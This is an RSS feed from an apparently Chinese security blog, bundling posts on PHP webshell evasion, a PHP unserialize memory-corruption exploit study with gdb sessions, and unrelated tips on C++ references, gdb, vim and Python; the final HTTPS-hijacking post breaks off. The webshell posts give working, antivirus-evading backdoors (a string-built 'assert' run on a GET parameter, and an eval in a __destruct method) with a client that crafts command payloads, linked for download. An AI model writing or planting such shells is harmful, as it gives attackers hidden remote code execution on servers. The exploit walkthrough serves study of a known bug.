<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="https://www.w3.org/2005/Atom">
  <channel>
    <title>quanyechavshuo</title>
    <description>A blog about programming and network security</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
    <pubDate>Tue, 02 May 2017 20:37:33 +0800</pubDate>
    <lastBuildDate>Tue, 02 May 2017 20:37:33 +0800</lastBuildDate>
    <generator>Jekyll v3.4.2</generator>
    
      <item>
        <title>tricks</title>
        <description>&lt;h3 id=&quot;about&quot;&gt;About&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;记录奇技
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;detail&quot;&gt;Detail&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.phpinfo页面+lfi漏洞可getshell
2.sqli可load_file时可利用smb重放反弹shell[未验证]
3.php代码审计时全文搜索unserilize函数的调用,分析这个unserilize有没有漏洞
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Thu, 27 Apr 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/web/2017/04/27/tricks/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2017/04/27/tricks/</guid>
        
        <category>tricks</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>php中&amp;引用免杀webshell</title>
        <description>&lt;h3 id=&quot;0x00-php中的&quot;&gt;0x00 php中的&amp;amp;&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.函数的参数引用
&amp;lt;?php
function test(&amp;amp;$a){ 
    $a=$a+100; 
    } 
    $b=1; 
    echo $b;//输出１ 
    test($b);   //这里$b传递给函数的其实是$b的变量内容所处的内存地址,通过在函数里改变$a的值就可以改变$b的值了 
    echo &quot;&amp;lt;br&amp;gt;&quot;; 
    echo $b;//输出101
?&amp;gt;

2.函数的返回引用
&amp;lt;?php
function &amp;amp;test()
{ 
    static $b=0;//申明一个静态变量 
    $b=$b+1; 
    echo $b; 
    return $b; 
}

$a=test();//这条语句会输出$b的值为１ 
$a=5; 
$a=test();//这条语句会输出$b的值为2
$a=&amp;amp;test();//这条语句会输出$b的值为3,这句相当于$a=&amp;amp;$b;
$a=5; 
$a=test();//这条语句会输出$b的值为6
?&amp;gt;

理解参考:
http://www.cnblogs.com/thinksasa/p/3334492.html
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x01-detail&quot;&gt;0x01 Detail&lt;/h3&gt;

&lt;h4 id=&quot;a利用函数的参数引用免杀&quot;&gt;a)利用函数的参数引用免杀&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php
function foo(&amp;amp;$var)
{
    $var=$var.'t';
}
$a=&quot;asser&quot;;
foo($a);
$a($_GET[cmd]);
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;b利用函数的返回引用免杀&quot;&gt;b)利用函数的返回引用免杀&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php
class talker{
    public $data = 'Hi';
    public function &amp;amp; get(){
        return $this-&amp;gt;data;
    }
}

$aa = new talker();
$d = &amp;amp;$aa-&amp;gt;get();
$d = $_GET[cmd];

function foo(&amp;amp;$var)
{
    $var=$var.'t';
}
$a=&quot;asser&quot;;
foo($a);
$a($aa-&amp;gt;data);

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;本文代码下载&lt;br /&gt;
&lt;a href=&quot;https://github.com/3xp10it/xwebshell/tree/master/php/%26&quot;&gt;download&lt;/a&gt;&lt;/p&gt;
</description>
        <pubDate>Tue, 25 Apr 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/web/2017/04/25/php%E4%B8%AD&%E5%BC%95%E7%94%A8%E5%85%8D%E6%9D%80/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2017/04/25/php%E4%B8%AD&%E5%BC%95%E7%94%A8%E5%85%8D%E6%9D%80/</guid>
        
        <category>php</category>
        
        <category>引用</category>
        
        <category>免杀</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>c++中的&amp;的用法</title>
        <description>&lt;h3 id=&quot;0x00-link&quot;&gt;0x00 Link&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://www.cnblogs.com/Mr-xu/archive/2012/08/07/2626973.html
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x01-detail&quot;&gt;0x01 Detail&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.c里面&amp;amp;只用作`取地址`的功能,c++中不但有此功能还新增了`引用`的功能

2.&amp;amp;作为c++中的引用功能时,在声明一个引用时不分配新内存,是被引用变量的别名,引用在声明时必须赋值

3.eg.
int a=1
int &amp;amp;b=a;引用    
c=&amp;amp;a;取地址
d=&amp;amp;b;取地址
在第2句中=左边的&amp;amp;符号是引用,第3|4句中的&amp;amp;是取地址,最后的结果是c与d相等

4.&amp;amp;和类型在一起的是引用,和变量在一起的是取地址
eg.
int func(int &amp;amp;a)
{};引用

5.不能建立引用的数组,因为数组是由元素组成,不能由&quot;别名&quot;组成,可以建立数组的引用(引用即别名)

6.引用的好处
void swap(int &amp;amp;a,int &amp;amp;b)
{
int c=a;a=b;b=c;
}
在swap函数被调用时如果两个参数是指针而不是引用,那么在形参转成实参的过程将申请新的内存,如果两个参数是引用则不用
新申请内存来存放两个实参
eg.
int main()
{
cin&amp;gt;&amp;gt;former&amp;gt;&amp;gt;latter;
swap(former,latter);
cout&amp;lt;&amp;lt;former&amp;lt;&amp;lt;latter;
}
这里main函数调用swap函数时如果输入的是2,3,main函数中调用swqp(2,3)时对应swap函数中:
swap函数中认为2的别名是former,3的别名是latter,swap函数认为a即是former,b即是latter,也即在swap函数调用时运行如下:
int &amp;amp;a=former;
int &amp;amp;b=latter;
int c=a;
a=b;
b=c;
这样就可直接操作main函数空间中的former和latter变量,从而不用再在swap函数中新申请内存并操作
实例:
------1.cpp-----
#include &amp;lt;iostream&amp;gt;
using namespace std;
void swap(int &amp;amp;a,int &amp;amp;b)
{
    int c=a;
    a=b;
    b=c;
}
int main()
{
    int former,latter;
    cin&amp;gt;&amp;gt;former&amp;gt;&amp;gt;latter;
    swap(former,latter);
    cout&amp;lt;&amp;lt;former&amp;lt;&amp;lt;latter;
    return 0;

}
-------end------
g++ 1.cpp -o 1
./1
输入
1111
2222
输出
22221111

------2.cpp------
#include &amp;lt;iostream&amp;gt;
using namespace std;
void swap(int a,int b)
{
    int c=a;
    a=b;
    b=c;
}
int main()
{
    int former,latter;
    cin&amp;gt;&amp;gt;former&amp;gt;&amp;gt;latter;
    swap(former,latter);
    cout&amp;lt;&amp;lt;former&amp;lt;&amp;lt;latter;
    return 0;

}
-------end-------
g++ 2.cpp -o 2
./2
输入
1111
2222
输出
11112222
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Tue, 25 Apr 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/auxilary/2017/04/25/c++%E4%B8%AD%E7%9A%84&%E7%9A%84%E7%94%A8%E6%B3%95/</link>
        <guid isPermaLink="true">http://localhost:4000/auxilary/2017/04/25/c++%E4%B8%AD%E7%9A%84&%E7%9A%84%E7%94%A8%E6%B3%95/</guid>
        
        <category>c/c++</category>
        
        
        <category>auxilary</category>
        
      </item>
    
      <item>
        <title>gdb命令</title>
        <description>&lt;h3 id=&quot;0x01-gdb常用命令&quot;&gt;0x01 gdb常用命令&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb
help
help data
help stack
help status

gdb stack0           #===&amp;gt;gdb + file stack0
l(list)              #show source
b 7(break 7)         #add break on line7
b 8(break 8)         #add break on line8
b 11
b 13
b 15
info b(info break)
info registers       #show registers
r(run)               #第一次运行或重新开始运行程序
start                #开始运行程序
continue             #继续运行
disas /m
            /r      #show hex(显示汇编指令对应十六进制值)
            /m      #show source if available(如果有源码,显示对应行源码)
set disassembly-flavor att/intel     #设置att或intel格式
set disassemble-next-line            #设置下一步是否显示汇编码
si或s(setpi)                            #==&amp;gt; step into,like f7 in od
ni或n(nexti)                            #==&amp;gt; like f8 in od
leave                #立即中断当前函数运行并返回,当前函数的剩余语句将不被执行
finish               #执行到当前函数返回之后停止,当前函数的剩余语句将正常运行
bt(backtrace)        #查看所有栈帧信息
f num(frame num)     #选择并打印第num个栈帧信息
info f(info frame)   #查看当前栈帧信息

layout:用于分割窗口,可以一边查看代码,一边测试:
layout src:显示源代码窗口
layout asm:显示反汇编窗口
layout regs:显示源代码/反汇编和CPU寄存器窗口
layout split:显示源代码和反汇编窗口
Ctrl + L:刷新窗口
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Thu, 20 Apr 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/web/2017/04/20/gdb%E5%91%BD%E4%BB%A4/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2017/04/20/gdb%E5%91%BD%E4%BB%A4/</guid>
        
        <category>gdb</category>
        
        <category>commands</category>
        
        <category>linux</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>PHP中的内存破坏漏洞利用学习</title>
        <description>&lt;h3 id=&quot;0x00-about&quot;&gt;0x00 About&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;学习乌云中的&amp;lt;&amp;lt;PHP中的内存破坏漏洞利用&amp;gt;&amp;gt;
link:http://cb.drops.wiki/drops/papers-4864.html

看懂此文所需知识
http://www.cnblogs.com/LittleHann/p/4242535.html
https://www.owasp.org/images/9/9e/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf

更多关于PHP内存破坏的学习
[php7中的unserialize漏洞利用]
    https://blog.checkpoint.com/wp-content/uploads/2016/08/Exploiting-PHP-7-unserialize-Report-160829.pdf
[fuzz unserialize]
    https://www.evonide.com/fuzzing-unserialize/
[一个很详细的关于php垃圾回收与uaf的漏洞分析]
http://www.freebuf.com/vuls/122938.html
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x01-detail&quot;&gt;0x01 Detail&lt;/h3&gt;

&lt;h4 id=&quot;a调试环境&quot;&gt;a)调试环境&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kali2 x86 
php5.4.34
gdb
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;b环境配置&quot;&gt;b)环境配置&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.下载php5.4.34到/root/php5.4.34    
    php5.4.34根目录下的.gdbinit是php为了方便被gdb调试,需要在gdb php之后source path/.gdbinit
        link:https://phpor.net/blog/post/997
        print_cvs:打印当前执行环境中已编译的PHP变量
        printzv 0x....:打印指定的PHP变量,需要指定地址
        zbacktrace:打印PHP函数调用栈
        print_ft:打印函数表 
        更多用法参考上面的链接

2.编译php到指定目录
    kali2.0下:
    mkdir /usr/bin/ndphp
    ./configure --prefix=/usr/bin/ndphp
        如果报xml2-config错误则apt-get install libxml2-dev可解决
    make
    make install

3.vi /root/StefanEsser_Original_POC.php
    -----------start------------
    &amp;lt;?php
    for ($i=4; $i&amp;lt;100; $i++) {
      var_dump($i);

      $m = new StdClass(); 
      $u = array(1); 
      $m-&amp;gt;aaa = array(1,2,&amp;amp;$u,4,5);

      $m-&amp;gt;bbb = 1;
      $m-&amp;gt;ccc = &amp;amp;$u;
      $m-&amp;gt;ddd = str_repeat(&quot;A&quot;, $i); 
      $z = serialize($m);
      $z = str_replace(&quot;bbb&quot;, &quot;aaa&quot;, $z);

      var_dump($z);

      $y = unserialize($z);

      var_dump($y);
    }
    ?&amp;gt;
    -----------end------------

4.vi /root/StefanEsser_Original_LocalMemLeak.php
    -----------start------------
    &amp;lt;?php
    $data ='O:8:&quot;stdClass&quot;:3:{s:3:&quot;aaa&quot;;a:5:{i:0;i:1;i:1;i:2;i:2;s:39:&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;;i:3;i:4;i:4;i:5;}s:3:&quot;aaa&quot;;i:1;s:3:&quot;ccc&quot;;R:5;}';
    $x = unserialize($data);
    var_dump($x);
    ?&amp;gt;
    -----------end------------
5.vi /root/PHPLeak.php
    -----------start------------
    &amp;lt;?php
    $fakezval = pack(
        'IIII',     //unsigned int
        0x08048000, //address to leak
        0x0000000f, //length of string
        0x00000000, //refcount
        0x00000006  //data type NULL=0,LONG=1,DOUBLE=2,BOOL=3,ARR=4,OBJ=5,STR=6,RES=7
    );
    //obj from original POC by @ion1c
    $obj = 'O:8:&quot;stdClass&quot;:4:{s:3:&quot;aaa&quot;;a:5:{i:0;i:1;i:1;i:2;i:2;a:1:{i:0;i:1;}i:3;i:4;i:4;i:5;}s:3:&quot;aaa&quot;;i:1;s:3:&quot;ccc&quot;;R:5;s:3:&quot;ddd&quot;;s:4:&quot;AAAA&quot;;}';
    $obj=unserialize($obj);

    for($i = 0; $i &amp;lt; 5; $i++) { //this i value is larger than usually required
        $v[$i]=$fakezval.$i; //repeat to overwrite
    }
    //due to the reference being overwritten by our loop above, leak memory
    echo $obj-&amp;gt;ccc;
    ?&amp;gt;
    -----------end------------
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;c调试&quot;&gt;c)调试&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;测试StefanEsser_Original_POC.php是否会导致php解释器出问题
    └&amp;gt; /usr/bin/ndphp/bin/php StefanEsser_Original_POC.php 
    int(4)
    string(134) &quot;O:8:&quot;stdClass&quot;:4:{s:3:&quot;aaa&quot;;a:5:{i:0;i:1;i:1;i:2;i:2;a:1:{i:0;i:1;}i:3;i:4;i:4;i:5;}s:3:&quot;aaa&quot;;i:1;s:3:&quot;ccc&quot;;R:5;s:3:&quot;ddd&quot;;s:4:&quot;AAAA&quot;;}&quot;
    object(stdClass)#2 (3) {
      [&quot;aaa&quot;]=&amp;gt;
      int(1)
      [&quot;ccc&quot;]=&amp;gt;
      &amp;amp;NULL
      [&quot;ddd&quot;]=&amp;gt;
      string(4) &quot;AAAA&quot;
    }
    int(5)
    string(135) &quot;O:8:&quot;stdClass&quot;:4:{s:3:&quot;aaa&quot;;a:5:{i:0;i:1;i:1;i:2;i:2;a:1:{i:0;i:1;}i:3;i:4;i:4;i:5;}s:3:&quot;aaa&quot;;i:1;s:3:&quot;ccc&quot;;R:5;s:3:&quot;ddd&quot;;s:5:&quot;AAAAA&quot;;}&quot;
    object(stdClass)#1 (3) {
      [&quot;aaa&quot;]=&amp;gt;
      int(-1254177400)
      [&quot;ccc&quot;]=&amp;gt;
      &amp;amp;NULL
      [&quot;ddd&quot;]=&amp;gt;
      string(5) &quot;AAAAA&quot;
    }
    int(6)
    string(136) &quot;O:8:&quot;stdClass&quot;:4:{s:3:&quot;aaa&quot;;a:5:{i:0;i:1;i:1;i:2;i:2;a:1:{i:0;i:1;}i:3;i:4;i:4;i:5;}s:3:&quot;aaa&quot;;i:1;s:3:&quot;ccc&quot;;R:5;s:3:&quot;ddd&quot;;s:6:&quot;AAAAAA&quot;;}&quot;
    object(stdClass)#3 (3) {
      [&quot;aaa&quot;]=&amp;gt;
      int(1)
      [&quot;ccc&quot;]=&amp;gt;
      &amp;amp;NULL
      [&quot;ddd&quot;]=&amp;gt;
      string(6) &quot;AAAAAA&quot;
    }
    int(7)
    string(137) &quot;O:8:&quot;stdClass&quot;:4:{s:3:&quot;aaa&quot;;a:5:{i:0;i:1;i:1;i:2;i:2;a:1:{i:0;i:1;}i:3;i:4;i:4;i:5;}s:3:&quot;aaa&quot;;i:1;s:3:&quot;ccc&quot;;R:5;s:3:&quot;ddd&quot;;s:7:&quot;AAAAAAA&quot;;}&quot;
    object(stdClass)#2 (3) {
      [&quot;aaa&quot;]=&amp;gt;
      int(1)
      [&quot;ccc&quot;]=&amp;gt;
      &amp;amp;NULL
      [&quot;ddd&quot;]=&amp;gt;
      string(7) &quot;AAAAAAA&quot;
    }
    int(8)
    string(138) &quot;O:8:&quot;stdClass&quot;:4:{s:3:&quot;aaa&quot;;a:5:{i:0;i:1;i:1;i:2;i:2;a:1:{i:0;i:1;}i:3;i:4;i:4;i:5;}s:3:&quot;aaa&quot;;i:1;s:3:&quot;ccc&quot;;R:5;s:3:&quot;ddd&quot;;s:8:&quot;AAAAAAAA&quot;;}&quot;
    object(stdClass)#1 (3) {
      [&quot;aaa&quot;]=&amp;gt;
      int(1)
      [&quot;ccc&quot;]=&amp;gt;
      &amp;amp;NULL
      [&quot;ddd&quot;]=&amp;gt;
      string(8) &quot;AAAAAAAA&quot;
    }
    int(9)
    string(139) &quot;O:8:&quot;stdClass&quot;:4:{s:3:&quot;aaa&quot;;a:5:{i:0;i:1;i:1;i:2;i:2;a:1:{i:0;i:1;}i:3;i:4;i:4;i:5;}s:3:&quot;aaa&quot;;i:1;s:3:&quot;ccc&quot;;R:5;s:3:&quot;ddd&quot;;s:9:&quot;AAAAAAAAA&quot;;}&quot;
    [1]    2141 segmentation fault  /usr/bin/ndphp/bin/php StefanEsser_Original_POC.php

    果然出现segmentation fault

动态调试php
    └&amp;gt; gdb /usr/bin/ndphp/bin/php
    GNU gdb (Debian 7.11.1-2) 7.11.1
    Copyright (C) 2016 Free Software Foundation, Inc.
    License GPLv3+: GNU GPL version 3 or later &amp;lt;http://gnu.org/licenses/gpl.html&amp;gt;
    This is free software: you are free to change and redistribute it.
    There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;
    and &quot;show warranty&quot; for details.
    This GDB was configured as &quot;x86_64-linux-gnu&quot;.
    Type &quot;show configuration&quot; for configuration details.
    For bug reporting instructions, please see:
    &amp;lt;http://www.gnu.org/software/gdb/bugs/&amp;gt;.
    Find the GDB manual and other documentation resources online at:
    &amp;lt;http://www.gnu.org/software/gdb/documentation/&amp;gt;.
    For help, type &quot;help&quot;.
    Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...
    Reading symbols from /usr/bin/ndphp/bin/php...done.

    [加载php根目录下的.gdbinit]
    source /root/php-5.4.34/.gdbinit

    [下断点]
    (gdb) b var_unserializer.c:337

    [运行StefanEsser_Original_LocalMemLeak.php]
    r StefanEsser_Original_LocalMemLeak.php

    [第一次命中]
    Starting program: /usr/bin/ndphp/bin/php StefanEsser_Original_LocalMemLeak.php
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library &quot;/lib/i386-linux-gnu/libthread_db.so.1&quot;.

    Breakpoint 1, process_nested_data (p=p@entry=0xbfffbc48, max=max@entry=0xb5b65cfa &quot;&quot;, var_hash=var_hash@entry=0xbfffbc4c, ht=0xb5c6f9c4, elements=2, objprops=1, rval=0xbfffbc64) at /root/php-5.4.34/ext/standard/var_unserializer.c:337
    337                             convert_to_string(key);

    [跳过第一次命中后又发生了第二次命中]
    (gdb) c
    Continuing.

    Breakpoint 1, process_nested_data (p=p@entry=0xbfffbc48, max=max@entry=0xb5b65cfa &quot;&quot;, var_hash=var_hash@entry=0xbfffbc4c, ht=0xb5c6f9c4, elements=1, objprops=1, rval=0xbfffbc64) at /root/php-5.4.34/ext/standard/var_unserializer.c:337
    337                             convert_to_string(key);

    [执行print *(var_entries*)var_hash-&amp;gt;first][乌云上的原文说的执行printzv *(var_entries)var_hash-&amp;gt;first有误]
    (gdb) print *(var_entries*)var_hash-&amp;gt;first
    $1 = {data = {0xb5c6e9e0, 0xb5c6f9f4, 0xb5c6f108, 0xb5c6f178, 0xb5c6f1c0, 0xb5c6f238, 0xb5c6f280, 0xb5c6f0ec, 0x0 &amp;lt;repeats 1016 times&amp;gt;}, used_slots = 8, next = 0x0}
    可看出data变量是个数组,数组里面的内容是地址,这些地址指向unserialize函数解析的变量值,关注第5个0xb5c6f1c0(php
    代码中用的是R:5).查看这个地址中的内容:

    [printzv 0xb5c6f1c0]
    (gdb) printzv 0xb5c6f1c0
    [0xb5c6f1c0] (refcount=1) string(39): &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;

    [步过断点继续运行]
    (gdb) n
    338                             zend_hash_update(ht, Z_STRVAL_P(key), Z_STRLEN_P(key) + 1, &amp;amp;data,
    这里的zend_hash_update为可疑函数
    
    步过该可疑函数并查看刚才地址0xb5c6f1c0中出现了什么内容
    (gdb) n
    342                     zval_dtor(key);
    (gdb) printzv 0xb5c6f1c0
    [0xb5c6f1c0] (refcount=0) string(39): &quot;\35\0\0\0-\0\0\0\0\37777777761\37777777706\37777777665\0\0\0\0\0\0\0\0\1\0\0\0\0\0\0\0-\0\0\0\35\0\0\0D\37777777761\37777777706&quot;

    还要确认下该地址是不是还在var_hash表中,然后继续运行
    (gdb) print *(var_entries*)var_hash-&amp;gt;first
    $3 = {data = {0xb5c6e9e0, 0xb5c6f9f4, 0xb5c6f108, 0xb5c6f178, 0xb5c6f1c0, 0xb5c6f238, 0xb5c6f280, 0xb5c6f0ec, 0x0 &amp;lt;repeats 1016 times&amp;gt;}, used_slots = 8, next = 0x0}
    发现还在

    继续运行
    (gdb) c
    Continuing.
    object(stdClass)#1 (2) {
      [&quot;aaa&quot;]=&amp;gt;
      int(1)
      [&quot;ccc&quot;]=&amp;gt;
      &amp;amp;string(39) &quot;--D&quot;
    }
    [Inferior 1 (process 2416) exited normally]

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Wed, 19 Apr 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2017/04/19/PHP%E4%B8%AD%E7%9A%84%E5%86%85%E5%AD%98%E7%A0%B4%E5%9D%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0/</link>
        <guid isPermaLink="true">http://localhost:4000/%E4%BA%8C%E8%BF%9B%E5%88%B6/2017/04/19/PHP%E4%B8%AD%E7%9A%84%E5%86%85%E5%AD%98%E7%A0%B4%E5%9D%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0/</guid>
        
        <category>php</category>
        
        <category>漏洞利用</category>
        
        <category>二进制</category>
        
        
        <category>二进制</category>
        
      </item>
    
      <item>
        <title>unserialize免杀webshell</title>
        <description>&lt;h3 id=&quot;php的unserialize函数&quot;&gt;php的unserialize函数&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;php的unserialize反序列化函数可以将反序列化后的结果还原成数字,字符,数组,对象等类型,如果还原后的结果是对象且这个
对象对应的类有__wakeup,__destruct等函数,那么在unserialize函数执行后将执行对应的函数(__wakeup,__destruct等)

refer:
http://www.91ri.org/3960.html
https://www.owasp.org/index.php/PHP_Object_Injection
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;利用unserialize构造webshell&quot;&gt;利用unserialize构造webshell&lt;/h3&gt;

&lt;h4 id=&quot;服务端webshell&quot;&gt;服务端[webshell]&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php

class foo{
    public $data=&quot;text&quot;;
    function __destruct()
    {
        eval($this-&amp;gt;data);
    }

}

$file_name=$_GET['id'];
unserialize($file_name);
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;客户端相当于菜刀&quot;&gt;客户端[相当于菜刀]&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php

class foo{
    #public $data=&quot;phpinfo();&quot;;
    public $data=&quot;system('ls');&quot;;

}
$a=new foo;
$b=serialize($a);
echo &quot;please visit uri:\n&quot;.&quot;[your shell page url]&quot;.&quot;?id=&quot;.$b;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;理解&quot;&gt;理解&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;服务端被访问后在内存中有一个foo类模板,当客户端伪造一个同名的叫做foo的类的对象的序列化后的结果给服务端反序列化时
,服务端在反序列化这个这个传入的反序列化值后将认为这是当前内存中对应的foo类模板的一个实例对象,于是去执行当前内存
的foo类模板的__wakeup,__destruct等函数,但是恰好这些函数会造成php代码执行[eval($this-&amp;gt;data)],且$this-&amp;gt;data可控.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;本文代码对应下载链接如下&lt;br /&gt;
&lt;a href=&quot;https://github.com/3xp10it/xwebshell/tree/master/unserializePHP&quot;&gt;download&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&quot;more&quot;&gt;more&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;后来发现下面这篇文章已经总结得得好了
http://www.cnblogs.com/LittleHann/p/3522990.html
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

</description>
        <pubDate>Tue, 18 Apr 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/web/2017/04/18/unserialize%E5%85%8D%E6%9D%80webshell/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2017/04/18/unserialize%E5%85%8D%E6%9D%80webshell/</guid>
        
        <category>unserialize</category>
        
        <category>php</category>
        
        <category>webshell</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>vim技巧</title>
        <description>&lt;p&gt;###&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.免去.vimrc中写set pastetoggle=&amp;lt;f7&amp;gt;,(:set paste或:set unpaste)粘贴原文的时候直接用&quot;+寄存器
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Wed, 22 Mar 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/web/2017/03/22/vim%E6%8A%80%E5%B7%A7/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2017/03/22/vim%E6%8A%80%E5%B7%A7/</guid>
        
        <category>vim</category>
        
        <category>editor</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>python tips</title>
        <description>&lt;h3 id=&quot;0x00-about&quot;&gt;0x00 About&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;About python tips on &quot;bugs&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x01-detail&quot;&gt;0x01 Detail&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.python2/3在os.path.exists(&quot;~/...&quot;)时,无法自动识别当前系统的~目录,eg.macOS下的~为/var/root,ubuntu下的~为
/root,os.path.exists(&quot;~/1.txt&quot;)不认识~.

后来发现这不是bug,os.path.expanduser(&quot;~&quot;)可以认识~,http://www.cnblogs.com/xupeizhi/archive/2013/02/20/2918243.html

2.python以&quot;a+&quot;模式读文件读出的内容为空,要将文件指针移到开关再读,f=open(&quot;..&quot;,&quot;a+&quot;) &amp;amp;&amp;amp; f.seek(0) &amp;amp;&amp;amp; f.read()
http://stackoverflow.com/questions/14639936/how-to-read-from-file-opened-in-a-mode
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

</description>
        <pubDate>Fri, 17 Mar 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/python/2017/03/17/python-tips/</link>
        <guid isPermaLink="true">http://localhost:4000/python/2017/03/17/python-tips/</guid>
        
        <category>tips</category>
        
        <category>python</category>
        
        
        <category>python</category>
        
      </item>
    
      <item>
        <title>https劫持理解</title>
        <description>&lt;h3 id=&quot;0x00-link&quot;&gt;0x00 Link&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.https://www.zhihu.com/question/22795329
2.http://www.ruanyifeng.com/blog/2014/09/illustration-ssl.html
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x01-https与ssl&quot;&gt;0x01 https与ssl&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssl:secure socket layer安全套接层,https,ftps等都是建立在ssl基础上
